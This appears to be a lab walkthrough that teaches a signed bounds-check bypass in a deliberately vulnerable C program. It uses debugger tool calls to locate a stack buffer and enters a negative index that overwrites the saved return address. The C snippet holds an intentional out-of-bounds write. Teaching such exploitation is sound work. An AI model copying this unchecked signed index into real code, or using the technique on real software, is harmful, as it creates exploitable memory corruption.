# Integer Overflow — Signed Comparison Bypass

A signed integer vulnerability. The `idx` variable is `signed int`, and the
bounds check `idx > 64` allows negative values through. A negative index
writes before the buffer, corrupting the saved return address or adjacent
variables.

## The Binary

```c
int idx;
scanf("%d", &idx);

if (idx > 64)                      // signed check — negative values pass
    return 1;

buf[idx] = 0;                      // OOB write with negative index
```

Compiled with: `gcc -g -O0 -fno-stack-protector -no-pie -o integer-overflow integer-overflow.c`

## Walkthrough

### 1. Load and recon

```
edb_load_program(path="/tmp/integer-overflow")
edb_disassemble(location="main", count=30)
edb_list_functions()
```

### 2. Find the buffer location on the stack

```
edb_set_breakpoint(location="main+70")   # after scanf, before buf[idx]
edb_run()
edb_get_stack(count=32)
edb_evaluate_expression(expression="&buf")
```

Send index `0` at the prompt. Note the stack layout: `buf` is at a lower
address than the saved RBP and return address.

### 3. Calculate offset to return address

```
# buf = rbp-0x50 (example), return address = rbp+8
# offset = 0x50 + 8 = 0x58 (88 bytes)
# index -88 writes a null byte at the return address
```

### 4. Exploit with negative index

```
edb_restart_program()
# input: -88
edb_get_stack(count=32)
```

The null byte overwrites the low byte of the return address, potentially
redirecting execution to a nearby address.

### 5. Verify with breakpoints

```
edb_set_breakpoint(location="win")
edb_continue()
```

If the return address lands on `win`, you hit the breakpoint.

## MCP Tools Used

| Tool | Purpose |
|------|---------|
| `edb_disassemble` | Find buffer offset and bounds check logic |
| `edb_get_stack` | Visualize stack layout relative to buffer |
| `edb_evaluate_expression` | Compute `&buf` and `&buf[idx]` addresses |
| `edb_set_breakpoint` | Pause before/after OOB write |
| `edb_read_memory` | Read the corrupted return address bytes |
| `edb_get_registers` | Check RBP after corruption |
